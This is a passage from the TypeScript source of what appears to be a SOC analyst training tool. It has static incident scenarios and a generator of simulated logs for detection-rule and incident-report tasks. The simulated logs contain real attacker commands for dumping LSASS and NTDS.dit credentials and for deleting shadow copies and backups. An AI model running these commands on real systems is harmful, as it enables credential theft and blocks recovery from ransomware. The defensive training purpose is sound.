  GrantedAccess: 0x1010  (PROCESS_VM_READ | PROCESS_QUERY_INFORMATION)

=== LSASS DUMPING — METHOD 2: Task Manager (LOLBAS) ===
Sysmon EventID=10:
  SourceImage: C:\\Windows\\System32\\taskmgr.exe
  TargetImage: C:\\Windows\\System32\\lsass.exe
  GrantedAccess: 0x1fffff  (PROCESS_ALL_ACCESS — taskmgr is usually trusted)

=== LSASS DUMPING — METHOD 3: ProcDump (Sysinternals) ===
Sysmon EventID=1:
  Image: procdump.exe
  CommandLine: procdump.exe -ma lsass.exe C:\\Windows\\Temp\\lsass.dmp
  File Created: C:\\Windows\\Temp\\lsass.dmp (SHA256: f3e1d2c4b5a69788796a5b4c3d2e1f0a)

=== LSASS DUMPING — METHOD 4: comsvcs.dll MiniDump (AV-Bypass LOLBAS) ===
Sysmon EventID=1:
  Image: C:\\Windows\\System32\\rundll32.exe
  CommandLine: rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 688 C:\\Windows\\Temp\\out.dmp full
  Note: No AV detection on this method — most EDRs miss it

=== DCSYNC ATTACK — NETWORK REPLICATION ABUSE ===
Source: WS-ADMIN-02 (10.0.0.51) → Target: DC01 (10.0.0.10)

Security EventID=4662 on DC01:
  Properties: {1131f0aa-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes
  Properties: {1131f0ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All
  SubjectAccount: WS-ADMIN-02$ (machine account — anomaly! should be a DC)

Network: DRSUAPI/RPC DRSGetNCChanges calls observed (port 445)
  Replicating: krbtgt hash, Administrator hash

Generate detection rules covering ALL four LSASS methods plus DCSync:
1. Sysmon EventID=10 rule for suspicious LSASS access (GrantedAccess values + source process exclusions)
2. Windows Security EventID=4662 rule for DCSync (specific GUIDs + non-DC source detection)
3. Sigma rule for the comsvcs.dll LOLBAS bypass specifically
Include notes on each rule's false-positive risk and recommended exclusions.`,
  },

  // ══════════════════════════════════════════════════════════════════════════
  // INCIDENT REPORT DRAFT
  // ══════════════════════════════════════════════════════════════════════════

  {
    id: 'IR-001',
    title: 'Incident Report – Ransomware Deployment (WS-SALES-15)',
    taskType: 'incident-report-draft',
    difficulty: 'beginner',
    attackCategory: 'Ransomware',
    mitre: {
      tactic: 'Impact',
      techniques: ['T1486 – Data Encrypted for Impact', 'T1490 – Inhibit System Recovery'],
    },
    iocs: { ips: ['5.188.86.172'], domains: ['lockbit-recovery.onion'], hashes: ['b14c2b2b8e9d4f7a3c1e5d6f8a9b2c4e'] },
    description: 'Timeline of a LockBit 3.0 ransomware incident. Draft a structured IR report with executive summary, technical findings, and remediation plan.',
    incidentData: `TASK: Draft Incident Report
Incident: INC-2024-0318 | Classification: CRITICAL | Ransomware Deployment
Affected: WS-SALES-15, WS-DEV-22 | Business Impact: Sales and Dev systems encrypted

=== EVENT TIMELINE ===
2024-03-18T19:45:00Z — User mike.chen clicked a phishing link; credentials harvested
2024-03-18T21:30:00Z — Attacker authenticated via VPN with stolen credentials
2024-03-18T22:10:00Z — Attacker ran net user /domain to enumerate AD accounts
2024-03-18T22:14:00Z — Privilege escalation via Kerberoasting (svc_sql account compromised)
2024-03-20T22:15:03Z — Shadow copies deleted on WS-SALES-15 (vssadmin)
2024-03-20T22:17:31Z — ~808 MB exfiltrated to 5.188.86.172 over HTTPS (double extortion)
2024-03-20T22:31:12Z — Lateral movement via SMB to WS-DEV-22
2024-03-20T22:45:00Z — LockBit 3.0 encryption started: 14,847 files (WS-SALES-15)
2024-03-20T22:46:12Z — LockBit 3.0 encryption started: 9,234 files (WS-DEV-22)
2024-03-20T22:47:00Z — Ransom note dropped; recovery URL: lockbit-recovery.onion

=== BUSINESS IMPACT ===
- Sales team unable to access CRM and contract files
- Dev team lost access to code repositories and build artifacts
- ~808 MB of sensitive data potentially in attacker's hands
- Estimated recovery time: 3–5 business days

Draft a full incident report with:
1. Executive Summary (non-technical, 1 paragraph)
2. Technical Timeline (detailed, with MITRE ATT&CK references)
3. Indicators of Compromise
4. Root Cause Analysis
5. Containment Actions Taken
6. Remediation Plan (short and long term)
7. Lessons Learned`,
  },

  {
    id: 'IR-002',
    title: 'Incident Report – Business Email Compromise (CFO Wire Fraud)',
    taskType: 'incident-report-draft',
    difficulty: 'intermediate',
    attackCategory: 'Phishing',
    mitre: {
      tactic: 'Initial Access / Collection',
      techniques: [
        'T1566.002 – Phishing: Spearphishing Link',
        'T1114.002 – Email Collection: Remote Email Collection',
      ],
    },
    iocs: { ips: ['51.89.115.197'], domains: ['corp-invoices-portal.com'], hashes: [] },
    description: 'BEC incident where the CFO\'s M365 account was compromised via OAuth phishing. Attacker intercepted a wire transfer request and redirected $240,000. Draft the full IR report.',
    incidentData: `TASK: Draft Incident Report
Incident: INC-2024-0404 | Type: Business Email Compromise (BEC)
Financial Impact: $240,000 wire transfer redirected | Affected User: cfo@corp.com

=== EVENT TIMELINE ===
2024-04-01T08:01:14Z — CFO received phishing email purporting to be Microsoft; clicked link
2024-04-01T08:01:30Z — CFO consented to rogue OAuth app "Microsoft Teams Meeting Add-in"
  App granted: Mail.ReadWrite, offline_access
2024-04-01T08:22:00Z — Attacker (via OAuth token) silently read 14,882 CFO emails over 4 mins
2024-04-01T09:15:00Z — Finance Director emailed CFO requesting approval for $240K vendor payment
2024-04-01T09:16:00Z — Attacker intercepted email; created inbox rule to hide replies from CFO
2024-04-01T09:18:00Z — Attacker (posing as CFO) replied to Finance Director approving modified bank details
  Fraudulent IBAN: GB29NWBK60161331926819 (attacker-controlled account)
2024-04-01T09:45:00Z — Finance Director executed wire transfer: $240,000
2024-04-02T10:00:00Z — CFO noticed missing emails; IT alerted
2024-04-02T10:30:00Z — OAuth app revoked; inbox rules deleted
2024-04-02T11:00:00Z — Bank contacted; transfer recall initiated (outcome: pending)

=== BUSINESS IMPACT ===
- $240,000 financial loss (recovery uncertain)
- CFO mailbox compromised for ~26 hours before detection
- 14,882 emails potentially read by attacker (includes M&A discussions)

Draft a full incident report covering the above timeline. Include a section on how OAuth-based BEC bypasses traditional MFA and what technical controls would have prevented this.`,
  },

  {
    id: 'IR-003',
    title: 'Incident Report – Nation-State APT: Full Domain Compromise',
    taskType: 'incident-report-draft',
    difficulty: 'advanced',
    attackCategory: 'Supply Chain',
    mitre: {
      tactic: 'Multiple (Full Kill Chain)',
      techniques: [
        'T1195.002 – Supply Chain Compromise',
        'T1558.003 – Steal or Forge Kerberos Tickets: Kerberoasting',
        'T1003.003 – NTDS Credential Dumping',
        'T1048 – Exfiltration Over Alternative Protocol',
      ],
    },
    iocs: {
      ips: ['91.215.85.209', '45.141.87.103'],
      domains: ['telemetry-cdn.solarwinds-updates.org'],
      hashes: ['7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069'],
    },
    description: 'Full-kill-chain APT incident: trojanised SolarWinds DLL, Kerberoasting, NTDS.dit exfil, and full AD dump sent via Exchange to an attacker-controlled relay. Draft an executive + board-level IR report.',
    incidentData: `TASK: Draft Executive & Board-Level Incident Report
Incident: INC-2024-0392 | Classification: NATION-STATE APT | Duration: 72 hours undetected
Scope: BUILD-SRV-01, DC01, entire Active Directory forest

=== RECONSTRUCTED KILL CHAIN ===
T+0h (2024-03-10T11:22Z) — Trojanised SolarWinds DLL loaded on BUILD-SRV-01
  Initial vector: Compromised software update (supply chain)
  DLL SHA256: 7f83b1657ff1fc53b92dc18148a1d65dfc2d4b1fa3d677284addd200126d9069

T+0h (11:22:31Z) — C2 beacon established to 91.215.85.209 (telemetry-cdn.solarwinds-updates.org)
  Beacon masqueraded as SolarWinds telemetry (signed, trusted process)

T+16h (2024-03-11T03:44Z) — Kerberoasting: RC4-encrypted ticket requested for krbtgt
  Indicates attempt to forge Golden Ticket

T+16h (03:45:12Z) — NTDS.dit dumped via ntdsutil on DC01
  Contains: all domain user hashes, krbtgt hash, computer account hashes

T+17h (04:01:33Z) — NTDS.dit (89.4 MB) exfiltrated via Exchange to 45.141.87.103
  Exfil channel: SMTP relay to api.cloudflare-dns.io (attacker-controlled)

T+72h (2024-03-12T07:18Z) — EDR finally alerts on LSASS and NTDS.dit anomalies

=== BLAST RADIUS ASSESSMENT ===
- Full Active Directory credential database exfiltrated
- All domain accounts must be treated as compromised (incl. krbtgt x2)
- Supply chain integrity of SolarWinds deployment unknown
- Estimated attacker dwell time: 72+ hours

=== REGULATORY EXPOSURE ===
- GDPR Article 33: 72-hour breach notification requirement applies
- If any EU data subjects' PII was in AD or email: Article 34 notification likely required
- SOC 2 Type II: Incident logging and response controls must be reviewed

Draft a board-level IR report including: Executive Summary for non-technical board members, full technical timeline, blast radius assessment, regulatory obligations, immediate containment actions, and a 90-day strategic remediation roadmap.`,
  },
];

// ─── Scenario Generator ───────────────────────────────────────────────────────

const GEN_USERS    = ['john.smith','jane.doe','mike.chen','sarah.wilson','alex.johnson','emma.davis','chris.brown'];
const GEN_DEPTS    = ['FINANCE','HR','IT','SALES','DEV','OPS','MGMT'];
const GEN_MALWARE  = ['CobaltStrike Beacon 4.x','Emotet v5','BlackCat/ALPHV','LockBit 3.0','Sliver C2','Brute Ratel C4'];
const GEN_RANSOMWARE_EXTS = ['.locked','.blackcat','.lockbit3','.crypt','.enc','.darkside'];

export function generateDojo2Scenario(
  attackCategory: Dojo2AttackCategory,
  difficulty: Dojo2Difficulty,
  taskType?: Dojo2TaskType,
): Dojo2IncidentScenario {
  const extIp   = randomExtIp();
  const intIp1  = randomIntIp();
  const intIp2  = randomIntIp();
  const c2Domain = randomDomain();
  const user    = randomUser();
  const host1   = randomHost('WS');
  const host2   = randomHost('WS');
  const srv     = randomHost('SRV');
  const hash1   = randomHex(64);
  const hash2   = randomHex(40);
  const base    = new Date('2024-03-20T14:00:00Z');

  // Choose task type based on attack category if not specified
  const inferredTask: Dojo2TaskType = taskType ?? (
    attackCategory === 'C2 Beaconing' || attackCategory === 'DNS Tunneling' || attackCategory === 'Credential Dumping'
      ? 'detection-rule-gen'
      : attackCategory === 'Supply Chain' || attackCategory === 'Cloud Identity Abuse' || attackCategory === 'Phishing'
      ? 'alert-enrichment'
      : 'log-triage'
  );

  // ── Brute Force ────────────────────────────────────────────────────────────
  if (attackCategory === 'Brute Force') {
    const numFails = difficulty === 'beginner' ? 8 : difficulty === 'intermediate' ? 22 : 80;
    const targetUser = ['svcadmin','helpdesk','backup_svc','api_user'][rnd(0,3)];
    let logs = `INCIDENT: SSH Authentication Log – ${srv}\nAnalyze the following auth log and determine if a breach occurred.\n\n`;
    const commonUsers = ['admin','root','ubuntu','test','backup','user'];
    for (let i = 0; i < numFails; i++) {
      const u = i < 4 ? 'invalid user ' + commonUsers[i % commonUsers.length] : targetUser;
      logs += `${ts(base, i * 2)} sshd[${4800+i}]: Failed password for ${u} from ${extIp} port ${50000+i} ssh2\n`;
    }
    logs += `${ts(base, numFails * 2)} sshd[${4800+numFails}]: Accepted password for ${targetUser} from ${extIp} port ${50000+numFails} ssh2\n`;
    logs += `${ts(base, numFails * 2)} sshd[${4800+numFails}]: pam_unix(sshd:session): session opened for user ${targetUser} by (uid=0)\n`;
    if (difficulty !== 'beginner') {
      logs += `${ts(base, numFails*2+8)} sudo[${5000+numFails}]: ${targetUser} : USER=root ; COMMAND=/bin/bash\n`;
    }
    if (difficulty === 'advanced') {
      logs += `${ts(base, numFails*2+20)} useradd[${5100+numFails}]: new user: name=svc-maint, UID=1337, by root\n`;
      logs += `${ts(base, numFails*2+25)} sshd[${5200+numFails}]: Accepted publickey for svc-maint from ${extIp} port ${50100+numFails} ssh2\n`;
    }
    logs += `\nIdentify: attack type, total attempts, breach outcome, post-compromise activity, and provide IOCs + containment steps.`;

    return {
      id: `GEN-BF-${randomHex(6).toUpperCase()}`,
      title: `[Generated] SSH Brute Force – ${srv}`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Brute Force',
      mitre: { tactic: 'Credential Access', techniques: ['T1110.001 – Brute Force: Password Guessing'] },
      iocs: { ips: [extIp], domains: [], hashes: [] },
      description: `Generated: SSH brute-force log from ${srv}. ${numFails} failed attempts before success. ${difficulty} difficulty.`,
      incidentData: logs,
      generated: true,
    };
  }

  // ── Phishing ───────────────────────────────────────────────────────────────
  if (attackCategory === 'Phishing') {
    const doc = ['Invoice_Q1_2024.xlsm','Contract_Amendment.docm','Salary_Review.xlsm','Purchase_Order_8821.docm'][rnd(0,3)];
    let data = `INCIDENT: Phishing Alert — ${host1}\nUser: ${user}@corp.internal | Timestamp: ${ts(base,0)}\n\n`;
    data += `FROM: "Finance Team" <billing@${randomDomain()}>\n`;
    data += `TO: ${user}@corp.internal\n`;
    data += `SUBJECT: ${['URGENT: Payment Required','Invoice Overdue – Action Required','Q1 Budget Approval Needed','Contract Signature Deadline'][rnd(0,3)]}\n\n`;
    data += `ATTACHMENT: ${doc}\n  SHA256: ${hash1}\n  Macro: YES | Signed: NO\n\n`;
    data += `Sender IP: ${extIp} | AbuseIPDB score: ${rnd(85,100)}/100\n`;
    data += `SPF: FAIL | DKIM: FAIL | DMARC: FAIL\n`;
    if (difficulty !== 'beginner') {
      data += `\n=== ENDPOINT TELEMETRY (${host1}) ===\n`;
      data += `${ts(base,120)} EXCEL.EXE opened: ${doc}\n`;
      data += `${ts(base,128)} EXCEL.EXE → CMD.EXE (PID ${rnd(7000,9000)})\n`;
      data += `${ts(base,130)} CMD.EXE → PowerShell.exe -ep bypass -enc [base64]\n`;
      data += `${ts(base,135)} Network connection to ${extIp}:443 — C2 channel: ${c2Domain}\n`;
      data += `${ts(base,138)} File dropped: C:\\Users\\${user}\\AppData\\Roaming\\${randomHex(8)}.exe (SHA256: ${hash2})\n`;
    }
    if (difficulty === 'advanced') {
      data += `\n=== LATERAL MOVEMENT ===\n`;
      data += `${ts(base,300)} ${host1} → SMB → ${host2}\\ADMIN$\n`;
      data += `${ts(base,310)} Beacon deployed on ${host2}\n`;
      data += `${ts(base,320)} C2 beacon interval: ~60s ±30% jitter to ${c2Domain}\n`;
      data += `${ts(base,600)} Domain enumeration: net user /domain, net group "Domain Admins" /domain\n`;
    }
    data += `\nEnrich this alert: classify attack, map to MITRE ATT&CK, extract all IOCs, determine execution outcome, and recommend containment.`;

    return {
      id: `GEN-PH-${randomHex(6).toUpperCase()}`,
      title: `[Generated] Phishing – ${user}@corp`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Phishing',
      mitre: { tactic: 'Initial Access', techniques: ['T1566.001 – Phishing: Spearphishing Attachment', 'T1204.002 – User Execution: Malicious File'] },
      iocs: { ips: [extIp], domains: [c2Domain], hashes: [hash1] },
      description: `Generated: Phishing email targeting ${user}@corp.internal with macro-enabled attachment. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Malware Execution ──────────────────────────────────────────────────────
  if (attackCategory === 'Malware Execution') {
    const malware = GEN_MALWARE[rnd(0, GEN_MALWARE.length - 1)];
    let data = `INCIDENT: Malware Execution Alert\nHost: ${host1} (${intIp1}) | Malware: ${malware}\nTimestamp: ${ts(base,0)}\n\n`;
    data += `=== EDR DETECTION ===\n`;
    data += `${ts(base,0)} Process created: C:\\Windows\\Temp\\${randomHex(8)}.exe (SHA256: ${hash1})\n`;
    data += `  Parent: ${['WINWORD.EXE','EXCEL.EXE','OUTLOOK.EXE','mshta.exe'][rnd(0,3)]}\n`;
    data += `  Signature: ${malware} variant — confidence HIGH\n`;
    data += `${ts(base,5)} Network: ${intIp1}:${rnd(49152,65535)} → ${extIp}:443 (${c2Domain}) ESTABLISHED\n`;
    data += `${ts(base,10)} Registry: HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ = "${randomHex(8)}.exe"\n`;
    data += `${ts(base,15)} File: C:\\Users\\${user}\\AppData\\Roaming\\${randomHex(8)}.dll created (MD5: ${randomHex(32)})\n`;
    if (difficulty !== 'beginner') {
      data += `${ts(base,60)} Process injection: ${randomHex(8)}.exe → svchost.exe (PID ${rnd(800,4000)})\n`;
      data += `  Technique: Process Hollowing (PE overwrite)\n`;
      data += `${ts(base,120)} Beacon interval: 60s ±15% | JA3: ${randomHex(32)}\n`;
    }
    if (difficulty === 'advanced') {
      data += `\n=== LATERAL SPREAD ===\n`;
      data += `${ts(base,300)} ${host1} → WMI → ${host2}: remote payload execution\n`;
      data += `${ts(base,310)} ${host2}: same ${malware} hash detected\n`;
      data += `${ts(base,600)} Kerberoast attempt: 3 SPN service accounts targeted\n`;
    }
    data += `\nAnalyze this malware execution: identify the malware family, map to MITRE ATT&CK, extract IOCs, determine scope of infection, and provide eradication steps.`;

    return {
      id: `GEN-MW-${randomHex(6).toUpperCase()}`,
      title: `[Generated] Malware: ${malware} – ${host1}`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Malware Execution',
      mitre: { tactic: 'Execution / C2', techniques: ['T1204 – User Execution', 'T1055 – Process Injection', 'T1071.001 – C2 Web Protocol'] },
      iocs: { ips: [extIp, intIp1], domains: [c2Domain], hashes: [hash1] },
      description: `Generated: ${malware} detected on ${host1}. Process injection + C2 beacon + persistence. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Ransomware ─────────────────────────────────────────────────────────────
  if (attackCategory === 'Ransomware') {
    const ext = GEN_RANSOMWARE_EXTS[rnd(0, GEN_RANSOMWARE_EXTS.length - 1)];
    const fileCount = rnd(8000, 25000);
    let data = `INCIDENT: Ransomware Deployment\nHost: ${host1} (${intIp1}) | User: ${user}\nTimestamp: ${ts(base,0)}\n\n`;
    data += `=== DEFENSE EVASION ===\n`;
    data += `${ts(base,0)} vssadmin.exe delete shadows /all /quiet\n`;
    data += `${ts(base,2)} wbadmin.exe delete catalog -quiet\n`;
    data += `${ts(base,4)} bcdedit.exe /set {default} recoveryenabled No\n`;
    data += `\n=== DATA EXFILTRATION (Double Extortion) ===\n`;
    const exfilMB = rnd(300, 1200);
    data += `${ts(base,120)} Outbound HTTPS → ${extIp}:443 (${c2Domain})\n`;
    data += `  Bytes out: ${(exfilMB * 1024 * 1024).toLocaleString()} (~${exfilMB} MB) | Duration: ${rnd(900,3600)}s\n`;
    if (difficulty !== 'beginner') {
      data += `\n=== LATERAL MOVEMENT ===\n`;
      data += `${ts(base,600)} SMB: ${host1} → \\\\${intIp2}\\ADMIN$ | File: ${randomHex(8)}.exe (SHA256: ${hash1})\n`;
      data += `${ts(base,620)} ${host2} (${intIp2}): payload executed\n`;
    }
    data += `\n=== ENCRYPTION EVENT ===\n`;
    data += `${ts(base,900)} Mass rename: ${fileCount.toLocaleString()} files → *${ext}\n`;
    data += `${ts(base,902)} Ransom note: C:\\Users\\Public\\Desktop\\README${ext}.txt\n`;
    if (difficulty === 'advanced') {
      data += `${ts(base,910)} Encryption also triggered on ${host2}: ${rnd(5000,15000).toLocaleString()} files\n`;
      data += `${ts(base,920)} Domain controller backup share targeted: \\\\DC01\\SYSVOL\n`;
    }
    data += `\nAnalyze this ransomware incident: identify the ransomware family if possible, map to MITRE ATT&CK, extract IOCs, estimate the full blast radius, and provide an IR action plan.`;

    return {
      id: `GEN-RW-${randomHex(6).toUpperCase()}`,
      title: `[Generated] Ransomware – ${host1}`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Ransomware',
      mitre: { tactic: 'Impact', techniques: ['T1486 – Data Encrypted for Impact', 'T1490 – Inhibit System Recovery', 'T1048 – Exfil Over Alternative Protocol'] },
      iocs: { ips: [extIp], domains: [c2Domain], hashes: [hash1] },
      description: `Generated: Ransomware deployment on ${host1}. Shadow copy deletion, ${exfilMB} MB exfil, ${fileCount.toLocaleString()} files encrypted. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── C2 Beaconing ───────────────────────────────────────────────────────────
  if (attackCategory === 'C2 Beaconing') {
    const jitter = rnd(10, 40);
    const interval = rnd(30, 180);
    const ja3 = randomHex(32);
    const uri = ['/jquery-3.3.1.min.js', '/updates/check', '/api/v1/heartbeat', '/cdn/assets/main.js'][rnd(0,3)];
    let data = `TASK: Detection Rule Generation — C2 Beaconing\n`;
    data += `Source: Network flow analysis + Sysmon logs | Host: ${host1} (${intIp1})\n\n`;
    data += `=== BEHAVIORAL PROFILE ===\n`;
    data += `Beacon destination: ${extIp}:443 (${c2Domain})\n`;
    data += `Beacon interval: ~${interval}s ± ${jitter}% jitter (${Math.round(interval*(1-jitter/100))}–${Math.round(interval*(1+jitter/100))}s range)\n`;
    data += `Protocol: HTTPS/443 | JA3: ${ja3}\n`;
    data += `User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)\n`;
    data += `URI Pattern: ${uri}, /api/v2/status\n\n`;
    data += `=== SYSMON PROCESS CHAIN ===\n`;
    data += `EXCEL.EXE → CMD.EXE → PowerShell.exe → rundll32.exe loading ${randomHex(8)}.dll from %TEMP%\n`;
    data += `Named pipe: \\\\.\\pipe\\MSSE-${rnd(1000,9999)}-server\n`;
    data += `File hash (implant DLL): ${hash1}\n\n`;
    data += `=== NETWORK BASELINE (same host, prior 7 days) ===\n`;
    data += `Normal connections: office365.com, windows.net, corp.internal — no unknown external IPs\n`;
    data += `Normal intervals: irregular (user-driven), NOT periodic\n\n`;
    data += `Generate detection rules:\n1. Sigma rule for the process chain (EXCEL→CMD→PS→rundll32)\n2. Network rule detecting periodic beaconing (interval regularity + JA3 hash)\n3. Tuning guidance and false-positive notes`;

    return {
      id: `GEN-C2-${randomHex(6).toUpperCase()}`,
      title: `[Generated] C2 Beacon Detection – ${host1}`,
      taskType: 'detection-rule-gen',
      difficulty,
      attackCategory: 'C2 Beaconing',
      mitre: { tactic: 'C2 / Execution', techniques: ['T1071.001 – C2 Web Protocol', 'T1059.001 – PowerShell', 'T1055 – Process Injection'] },
      iocs: { ips: [extIp], domains: [c2Domain], hashes: [hash1], other: [`JA3: ${ja3}`, `Named pipe: MSSE-*-server`] },
      description: `Generated: C2 beacon at ~${interval}s intervals to ${c2Domain}. JA3 + process chain indicators. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Credential Dumping ─────────────────────────────────────────────────────
  if (attackCategory === 'Credential Dumping') {
    let data = `TASK: Detection Rule Generation — Credential Dumping\n`;
    data += `Host: ${host1} (${intIp1}) | Attacker has SYSTEM\n\n`;
    data += `=== LSASS ACCESS OBSERVED ===\n`;
    data += `Sysmon EventID=10: taskmgr.exe → lsass.exe | GrantedAccess: 0x1fffff\n`;
    data += `Sysmon EventID=10: ${randomHex(8)}.exe → lsass.exe | GrantedAccess: 0x1010\n`;
    data += `Sysmon EventID=1: rundll32.exe comsvcs.dll, MiniDump ${rnd(500,900)} C:\\Windows\\Temp\\out.dmp full\n`;
    data += `File created: C:\\Windows\\Temp\\lsass.dmp (SHA256: ${hash1})\n`;
    if (difficulty !== 'beginner') {
      data += `\n=== DCSYNC (${host1} → DC-01) ===\n`;
      data += `Security EventID=4662 on DC01:\n`;
      data += `  Properties: {1131f0aa-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes\n`;
      data += `  Properties: {1131f0ad-9c07-11d1-f79f-00c04fc2dcd2} DS-Replication-Get-Changes-All\n`;
      data += `  SubjectAccount: ${host1}$ (machine account — NOT a DC)\n`;
    }
    if (difficulty === 'advanced') {
      data += `\n=== GOLDEN TICKET INDICATORS ===\n`;
      data += `EventID=4769: krbtgt Kerberos ticket with RC4 encryption (0x17) from ${intIp1}\n`;
      data += `EventID=4624: Logon with ticket lifetime >10h (Golden Ticket default)\n`;
    }
    data += `\nGenerate detection rules covering all LSASS dump methods and DCSync. Include the comsvcs.dll LOLBAS bypass specifically.`;

    return {
      id: `GEN-CD-${randomHex(6).toUpperCase()}`,
      title: `[Generated] Credential Dumping – ${host1}`,
      taskType: 'detection-rule-gen',
      difficulty,
      attackCategory: 'Credential Dumping',
      mitre: { tactic: 'Credential Access', techniques: ['T1003.001 – LSASS Memory', 'T1003.006 – DCSync'] },
      iocs: { ips: [intIp1], domains: [], hashes: [hash1], other: ['comsvcs.dll MiniDump', 'GrantedAccess 0x1010 / 0x1fffff'] },
      description: `Generated: LSASS dump + DCSync on ${host1}. Includes LOLBAS comsvcs.dll bypass. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── DNS Tunneling ──────────────────────────────────────────────────────────
  if (attackCategory === 'DNS Tunneling') {
    const qps = rnd(40, 100);
    const avgLen = rnd(70, 120);
    let data = `TASK: Detection Rule Generation — DNS Tunneling\n`;
    data += `Source: ${host1} (${intIp1}) | Target: ns1.${c2Domain}\n\n`;
    data += `=== SAMPLE QUERIES ===\n`;
    const b64samples = ['aGVsbG8gd29ybGQ=','dGhpcyBpcyBhIHRlc3Q=','cGF5bG9hZCBkYXRh','ZXhhbXBsZURhdGE=','c2Vuc2l0aXZlRGF0YQ=='];
    for (const s of b64samples) data += `TXT QUERY: ${s}.${c2Domain}\n`;
    data += `[... ${rnd(2000,4000)} further similar queries in 45 minutes ...]\n\n`;
    data += `=== STATISTICAL ANOMALIES vs BASELINE ===\n`;
    data += `Query rate:         ${qps}/min       (baseline: <5/min)\n`;
    data += `Avg subdomain len:  ${avgLen} chars   (baseline: <30)\n`;
    data += `TXT record ratio:   ${rnd(88,97)}%   (baseline: <2%)\n`;
    data += `Subdomain entropy:  ${(rnd(42,52)/10).toFixed(1)} bits/char (baseline: ~2.1)\n`;
    data += `\nGenerate: Sigma rule (statistical thresholds) + Zeek script (entropy-based) + tuning notes.`;

    return {
      id: `GEN-DT-${randomHex(6).toUpperCase()}`,
      title: `[Generated] DNS Tunneling – ${host1}`,
      taskType: 'detection-rule-gen',
      difficulty,
      attackCategory: 'DNS Tunneling',
      mitre: { tactic: 'Exfiltration / C2', techniques: ['T1048.003 – Exfil Over DNS', 'T1071.004 – C2: DNS'] },
      iocs: { ips: [intIp1], domains: [c2Domain], hashes: [] },
      description: `Generated: DNS tunneling via TXT queries at ${qps}/min. Avg subdomain ${avgLen} chars. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Supply Chain ────────────────────────────────────────────────────────────
  if (attackCategory === 'Supply Chain') {
    const pkg = ['log4j-core-2.14.1.jar','openssl-1.0.2t.dll','netsync-agent-3.2.1.exe','update-helper-x64.msi'][rnd(0,3)];
    const legitimateHash = randomHex(64);
    let data = `INCIDENT: Supply Chain Compromise — Trojanised Software Package\n`;
    data += `Scope: ${srv}, ${host1} (${intIp1}) | Duration: ${rnd(24,72)} hours undetected\n`;
    data += `Incident ID: INC-2024-${rnd(1000,9999)} | Classification: CRITICAL\n\n`;
    data += `=== SUPPLY CHAIN ENTRY POINT ===\n`;
    data += `Trojanised package: ${pkg}\n`;
    data += `Expected SHA256:   ${legitimateHash}\n`;
    data += `Compromised SHA256: ${hash1}\n`;
    data += `[ANOMALY] Compile timestamp: ${ts(base,-7*24*3600)} | Code-signing cert date: ${ts(base,-90*24*3600)} — MISMATCH\n`;
    data += `Installed via auto-update on ${ts(base,0)} | DLL loaded: ${ts(base,30)}\n\n`;
    data += `=== INITIAL C2 CALLBACK ===\n`;
    data += `${ts(base,60)} rundll32.exe → ${extIp}:443 (${c2Domain})\n`;
    data += `Beacon size: 4096 bytes | JA3: ${randomHex(32)}\n`;
    data += `Traffic masqueraded as vendor telemetry\n\n`;
    if (difficulty !== 'beginner') {
      data += `=== PRIVILEGE ESCALATION + CREDENTIAL THEFT ===\n`;
      data += `${ts(base,3600)} EventID=4769: RC4-encrypted Kerberos ticket requested for krbtgt (org policy: AES256 only)\n`;
      data += `${ts(base,3660)} ntdsutil "ac i ntds" "ifm" "create full C:\\Windows\\Temp\\ntds_bk" q q\n`;
      data += `File created: C:\\Windows\\Temp\\ntds_bk\\ntds.dit (${rnd(40,120)}.${rnd(1,9)} MB) | Hash: ${hash2}\n`;
      data += `${ts(base,3720)} Exfil: SMTP relay → ${extIp} | Attachment: ntds.dit (${rnd(40,120)} MB)\n\n`;
    }
    if (difficulty === 'advanced') {
      data += `=== LATERAL MOVEMENT + PERSISTENCE ===\n`;
      data += `${ts(base,7200)} Service installed: "${['WindowsUpdateHelper','SolarWindsOrion','TelemetryCollector'][rnd(0,2)]}" (SYSTEM)\n`;
      data += `${ts(base,7260)} Pass-the-hash: ${srv} → ${host2} (${intIp2}) → DC01\n`;
      data += `${ts(base,7320)} Golden Ticket forged — krbtgt hash obtained from NTDS.dit\n`;
      data += `${ts(base,7380)} AD enumeration: all users, groups, GPOs, OUs exfiltrated\n\n`;
    }
    data += `Analyze this incident: identify the initial compromise vector, map the full kill chain to MITRE ATT&CK, extract every IOC, assess blast radius, and provide a prioritised remediation plan.`;

    return {
      id: `GEN-SC-${randomHex(6).toUpperCase()}`,
      title: `[Generated] Supply Chain Compromise – ${pkg.split('-')[0]}`,
      taskType: inferredTask,
      difficulty,
      attackCategory: 'Supply Chain',
      mitre: {
        tactic: 'Initial Access / Credential Access / Exfiltration',
        techniques: ['T1195.002 – Supply Chain Compromise', 'T1071.001 – C2 Web Protocol', 'T1003.003 – NTDS Credential Dumping'],
      },
      iocs: { ips: [extIp, intIp1], domains: [c2Domain], hashes: [hash1, hash2] },
      description: `Generated: Trojanised package "${pkg}" with C2 callback and credential exfiltration. ${difficulty} difficulty.`,
      incidentData: data,
      generated: true,
    };
  }

  // ── Cloud Identity Abuse ────────────────────────────────────────────────────
  if (attackCategory === 'Cloud Identity Abuse') {
    const appId = `${randomHex(8)}-${randomHex(4)}-${randomHex(4)}-${randomHex(4)}-${randomHex(12)}`;
    const appName = ['Microsoft Teams Meeting Add-in','OneDrive Sync Tool','SharePoint Integration Helper','Azure AD Connect Utility'][rnd(0,3)];
    const emailsRead = rnd(5000, 20000);
